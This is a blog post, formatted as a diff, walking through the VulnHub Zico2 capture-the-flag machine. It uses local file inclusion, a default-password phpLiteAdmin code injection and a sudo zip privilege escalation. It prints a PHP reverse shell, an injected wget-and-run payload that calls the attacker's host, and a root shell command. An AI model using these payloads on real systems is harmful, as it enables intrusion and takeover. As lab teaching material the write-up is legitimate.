@@ -1,0 +1,289 @@
+---
+layout: post
+title: "Zico2 writeup"
+subtitle: "~ Walkthrough of Zico2 machine ~"
+date: 2017-10-07
+author: V3ded
+category: CTF
+tags: blog ctf pentesting 
+finished: true
+excerpt_separator: <!--more-->
+---
+
+# Intro
+
+[Zico2](https://www.vulnhub.com/entry/zico2-1,210/){:target="_blank"}! Yet another machine to continue our learning journey of enumerating & breaking into systems. How exciting does that sound? Make yourself comfortable and let's start. <!--more-->
+
+***
+
+# Reconnaissance
+
+Before starting information gathering we need to get the IP of our target box. The method you choose may vary, however I sided with a simple netdiscover ARP scan.
+
+```console 
+root@EdgeOfNight:~# netdiscover
+Currently scanning: 192.168.178.0/16   |   Screen View: Unique Hosts                                                                                                                                             
+                                                                                                                                                                                                                  
+43 Captured ARP Req/Rep packets, from 7 hosts.   Total size: 2580                                                                                                                                                
+_____________________________________________________________________________
+  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+-----------------------------------------------------------------------------
+192.168.1.11     [REDACTED]          7     420     AzureWave Technology Inc.                                                                                                                                      
+192.168.1.17     [REDACTED]          6     360     PCS Systemtechnik GmbH                                                                                                                                         
+192.168.1.1      [REDACTED]          20    1200    ADB Broadband Italia                                                                                                                                           
+192.168.1.10     [REDACTED]          2     120     Unknown vendor                                                                                                                                                 
+192.168.1.19     [REDACTED]          2     120     Unknown vendor                                                                                                                                                 
+192.168.1.13     [REDACTED]          4     240     LG Innotek                                                                                                                                                     
+192.168.1.16     [REDACTED]          2     120     Unknown vendor
+```
+
+Zico vulnerable machine has been assigned an IP of **192.168.1.17**!
+
+Let's port-scan the box and get more intel.
+
+```console
+root@EdgeOfNight:~# nmap -A -v -T5 -sS 192.168.1.17
+Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-06 23:32 BST
+NSE: Loaded 146 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 23:32
+Completed NSE at 23:32, 0.00s elapsed
+Initiating NSE at 23:32
+Completed NSE at 23:32, 0.00s elapsed
+Initiating ARP Ping Scan at 23:32
+Scanning 192.168.1.17 [1 port]
+Completed ARP Ping Scan at 23:32, 0.22s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 23:32
+Completed Parallel DNS resolution of 1 host. at 23:32, 0.00s elapsed
+Initiating SYN Stealth Scan at 23:32
+Scanning zico (192.168.1.17) [1000 ports]
+Discovered open port 22/tcp on 192.168.1.17
+Discovered open port 111/tcp on 192.168.1.17
+Discovered open port 80/tcp on 192.168.1.17
+Warning: 192.168.1.17 giving up on port because retransmission cap hit (2).
+Completed SYN Stealth Scan at 23:32, 2.64s elapsed (1000 total ports)
+Initiating Service scan at 23:32
+Scanning 3 services on zico (192.168.1.17)
+Completed Service scan at 23:32, 6.09s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against zico (192.168.1.17)
+NSE: Script scanning 192.168.1.17.
+Initiating NSE at 23:32
+Completed NSE at 23:32, 0.40s elapsed
+Initiating NSE at 23:32
+Completed NSE at 23:32, 0.01s elapsed
+Nmap scan report for zico (192.168.1.17)
+Host is up (0.00034s latency).
+Not shown: 995 closed ports
+PORT      STATE    SERVICE         VERSION
+22/tcp    open     ssh             OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
+|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
+|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
+80/tcp    open     http            Apache httpd 2.2.22 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS GET HEAD
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Zico's Shop
+111/tcp   open     rpcbind         2-4 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          48498/tcp  status
+|_  100024  1          50142/udp  status
+2103/tcp  filtered zephyr-clt
+44442/tcp filtered coldfusion-auth
+MAC Address: 08:00:27:98:69:CA (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.5
+Uptime guess: 0.054 days (since Fri Oct  6 22:15:15 2017)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=264 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.34 ms zico (192.168.1.17)
+
+NSE: Script Post-scanning.
+Initiating NSE at 23:32
+Completed NSE at 23:32, 0.00s elapsed
+Initiating NSE at 23:32
+Completed NSE at 23:32, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.06 seconds
+           Raw packets sent: 1198 (55.288KB) | Rcvd: 1188 (50.012KB)
+```
+
+Port 20,80 and 111 open - time to enumerate them. With multiple ports available, I usually aim for the webserver first. There are many tools to ease this process such as [Nikto](http://sectools.org/tool/nikto/){:target="_blank"}, [Dirb](https://tools.kali.org/web-applications/dirb){:target="_blank"}/[Dirbuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project){:target="_blank"}, nmap scripts, [OWASP-ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project){:target="_blank"}, [wpscan](https://wpscan.org/){:target="_blank"} and the list goes on. Nikto, wpscan are common web vulnerability scanners, Dirb & Dirbuster directory bruteforcers. This sort of active scanning takes up a lot of time and therefore it is important to que the scans in right order to save as much time as possible. I proceed to run `dirb` while I manually browse the webpage for clues.
+
+Webpage:
+
+<a href="/img/blog/zico2/Zico1.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico1.png"></a>
+
+Time to look around! Top header bar shows us 4 options - about, services, portfolio and contact. All of these just redirect you somewhere within the index page and therefore it's useless to click them. Scrolling down, there is a segment with a button which says _Ok... Show me the tools?! - CHECK THEM OUT!_. This is a redirect to `http://192.168.1.17/view.php?page=tools.html`. 
+
+<a href="/img/blog/zico2/Zico2.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico2.png"></a>
+
+Interesting enough, the URL is possibly prone to [Local File Inclusion](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/){:target="_blank"} from the looks of it. `http://192.168.1.17/view.php?page=../../../../etc/passwd` writes out the content of passwd file which proves the previous statement of possible LFI. Unfortunately LFI only allows us to read files, not upload them. Blindly browsing through the filesystem won't result in anything. I attempted many tricks such as *php://expect*, *php://filter*, */proc/self/environ* code execution to improve the current situation... Unfortunately, the results came out blank. Check [LFI cheatsheet](https://highon.coffee/blog/lfi-cheat-sheet/){:target="_blank"} from HighOnCoffee if any of these things are unclear to you.
+
+LFI PoC:
+
+<a href="/img/blog/zico2/Zico3.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico3.png"></a>     
+
+After an exhausting manual search and not any more clues left, I look back on my `dirb` result. Look at this wonderful pile of information!
+
+Dirb output:
+```console
+root@EdgeOfNight:~# dirb http://192.168.1.17 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Sat Oct  7 00:00:43 2017
+URL_BASE: http://192.168.1.17/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.1.17/ ----
++ http://192.168.1.17/cgi-bin/ (CODE:403|SIZE:288)                                                                                                                                                                
+==> DIRECTORY: http://192.168.1.17/css/                                                                                                                                                                           
+==> DIRECTORY: http://192.168.1.17/dbadmin/                                                                                                                                                                       
+==> DIRECTORY: http://192.168.1.17/img/                                                                                                                                                                           
++ http://192.168.1.17/index (CODE:200|SIZE:7970)                                                                                                                                                                  
++ http://192.168.1.17/index.html (CODE:200|SIZE:7970)                                                                                                                                                             
+==> DIRECTORY: http://192.168.1.17/js/                                                                                                                                                                            
++ http://192.168.1.17/LICENSE (CODE:200|SIZE:1094)                                                                                                                                                                
++ http://192.168.1.17/package (CODE:200|SIZE:789)                                                                                                                                                                 
++ http://192.168.1.17/server-status (CODE:403|SIZE:293)                                                                                                                                                           
++ http://192.168.1.17/tools (CODE:200|SIZE:8355)                                                                                                                                                                  
+==> DIRECTORY: http://192.168.1.17/vendor/                                                                                                                                                                        
++ http://192.168.1.17/view (CODE:200|SIZE:0)                                                                                                                                                                      
+                                                                                                                                                                                                                  
+---- Entering directory: http://192.168.1.17/css/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                  
+---- Entering directory: http://192.168.1.17/dbadmin/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                  
+---- Entering directory: http://192.168.1.17/img/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                  
+---- Entering directory: http://192.168.1.17/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                                                  
+---- Entering directory: http://192.168.1.17/vendor/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Sat Oct  7 00:00:49 2017
+DOWNLOADED: 4612 - FOUND: 8  
+```
+As a result of this we find many hidden accessible directories such as **/dbadmin/**, **/js/**, **/vendor/** and **/view/**. **/dbadmin/** sounds like an interesting one, so let's see what it shows. 
+
+<a href="/img/blog/zico2/Zico4.png" target="_blank"><img class="centerImgSmall" src="/img/blog/zico2/Zico4.png"></a>
+
+The php file leads to:
+
+<a href="/img/blog/zico2/Zico5.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico5.png"></a>
+
+Before any bruteforcing attempt, I usually search for already known exploit corresponding to a service version. There are many ways of doing this, like using searchsploit or Google. 
+Searchsploit query for *phpLiteAdmin v1.9.3*
+```console
+root@EdgeOfNight:~# searchsploit phpLiteAdmin 1.9.3
+------------------------------------------------------------------ ----------------------------------
+ Exploit Title                                                    |  Path
+                                                                  | (/usr/share/exploitdb/platforms/)
+------------------------------------------------------------------ ----------------------------------
+PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                    | php/webapps/24044.txt
+------------------------------------------------------------------ ----------------------------------
+```    
+shows us that there indeed is an exploitable [vulnerability](https://www.exploit-db.com/exploits/24044/){:target="_blank"} which allows for PHP remote code execution after authentication. As always I tend to overcomplicate things and launch a hydra bruteforce attack, only then realizing the password was set to default this whole time. Now that we have the password *admin* let's get our reverse shell via php! 
+
+***
+
+# Exploitation
+
+If you have read the searchsploit file, getting the shell will be easy. There are of course many ways to approach this vulnerability, but I chose the following:
+
+1. Make a txt file inside /var/www/html with `<?php $sock=fsockopen("192.168.1.12",1234); exec("/bin/sh -i <&3 >&3 2>&3");?>` (this is our reverse shell - taken from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet){:target="_blank"})
+2. Start an apache web server using `/etc/init.d/apache2 start`
+
+To proceed with our exploitation, do as the exploitdb file says. Create a database with a .php extension (in my case shell.php):  
+
+<a href="/img/blog/zico2/Zico6.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico6.png"></a>
+
+Add a table inside it called shell, select 1 field:      
+
+<a href="/img/blog/zico2/Zico7.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico7.png"></a>
+
+Name the field whatever we wish, set it as *text* type, put `<?php system("wget 192.168.1.12/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>` into the default value & click create. This should create a new table with our exploit. The default value script plays a huge role here as it is used to download our main php reverse shell.
+
+<a href="/img/blog/zico2/Zico8.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico8.png"></a>
+ 
+`wget - downloads the the main file on the target machine`
+
+`-O /tmp/shell.php - converts the text file into php (this is used to prevent activation of php payload on our server) and saves it inside /tmp folder`
+
+`;php /tmp/shell.php - runs the php file with our malicious payload inside`
+     
+In order to activate our side script which downloads the malicious file, an HTTP request is needed. How would we do this though? I quickly reminded myself of the LFI vulnerability which allows me to browse the file system. All databases are located at **/usr/share/databases/** as it can be seen on the phpliteadmin side panel. See where I'm going? Start our netcat listener `nc -lvp 1234` and make an HTTP request via `192.168.1.17/view.php?page=../../../../usr/databases/shell.php`
+
+
+<a href="/img/blog/zico2/Zico9.png" target="_blank"><img class="centerImgLarge" src="/img/blog/zico2/Zico9.png"></a>
+
+Boom! A reverse connection has been made :).
+
+***
+
+# Privilege Escalation
+
+Time to snoop! (I stole that phrase from [g0blin](https://twitter.com/g0blinresearch){:target="_blank"} heh :P). There is nothing of interest inside **/var/** and **/tmp/** folders. All that remains is closer inspection of /home/zico/ which is present with many CMS files. 
+
+<a href="/img/blog/zico2/Zico10.png" target="_blank"><img class="centerImgLarge" src="/img/blog/zico2/Zico10.png"></a>
+
+After some exploration I discovered a wp-config.php (inside **/wordpress/**) file which has zico's login credentials.
+
+<a href="/img/blog/zico2/Zico11.png" target="_blank"><img class="centerImgLarge" src="/img/blog/zico2/Zico11.png"></a>
+
+Use them to connect via ssh: `ssh zico@192.168.1.17` and enumerate more with a nice TTY shell and job control. `sudo -l` shows that we can use zip or tar combined with sudo without providing a password. 
+
+<a href="/img/blog/zico2/Zico12.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico12.png"></a>
+
+This creates a security hole prone to privilege escalation vulnerability! Just make a random file using touch command (`touch exploit`) and zip it using this command:
+ ```console
+zico@zico:/tmp$ sudo zip exploit.zip exploit -T --unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'"
+```
+
+<a href="/img/blog/zico2/Zico13.png" target="_blank"><img class="centerImgHuge" src="/img/blog/zico2/Zico13.png"></a>
+
+```
+sudo - execute as superuser
+-T   - check the file integrity, execcutes the --unzip-command parameter (this command grants us a shell)
+--unzip-command="python -c 'import pty; pty.spawn(\"/bin/sh\")'" - spawns a /bin/sh shell
+```
+
+### Rooted!
+
+***
+
+# Conclusion
+Sorry for making this blog so lenghty! Sure, it was a long read, but I hope you atleast learnt a thing or two. Props to the author - [Rafael](https://twitter.com/rafasantos5){:target="_blank"} for making such an awesome machine. It sure was fun!
+
+If you have any questions feel free to reach out to me via my [about page](/about/){:target="_blank"} or comments below.
+~V3 
